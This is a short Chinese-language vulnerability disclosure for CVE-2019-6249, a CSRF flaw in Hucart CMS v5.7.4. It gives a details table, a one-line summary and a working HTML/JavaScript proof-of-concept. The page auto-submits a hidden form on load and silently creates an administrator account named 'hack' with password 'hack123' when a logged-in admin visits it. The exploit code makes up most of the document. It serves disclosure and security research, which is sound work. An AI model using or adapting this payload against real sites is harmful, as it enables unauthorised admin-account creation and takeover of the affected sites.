### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Hucart cms v5.7.4 CSRF漏洞可任意增加管理员账号|2019-01-13|AllenChen（520allen@gmail.com）|[http://www.hucart.com/](http://www.hucart.com/) | [http://www.hucart.com/](http://www.hucart.com/) |v5.7.4| [CVE-2019-6249](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6249)|  

#### 漏洞概述  

> Hucart cms v5.7.4版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加一个名为hack的管理员账号。   

### POC实现代码如下：  

> exp代码如下：  
> 增加一个名为hack密码为hack123的管理员账号。

``` html
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='adm_user' value='hack' />";
fields += "<input type='hidden' name='adm_email' value='admin@hack.com' />";  
fields += "<input type='hidden' name='adm_mobile' value='13888888888' />";  
fields += "<input type='hidden' name='adm_pwd' value='hack123' />";  
fields += "<input type='hidden' name='re_adm_pwd' value='hack123' />";  
fields += "<input type='hidden' name='adm_enabled' value='1' />";  
fields += "<input type='hidden' name='act_type' value='add' />";  
fields += "<input type='hidden' name='adm_id' value='' />";  

var url = "http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```
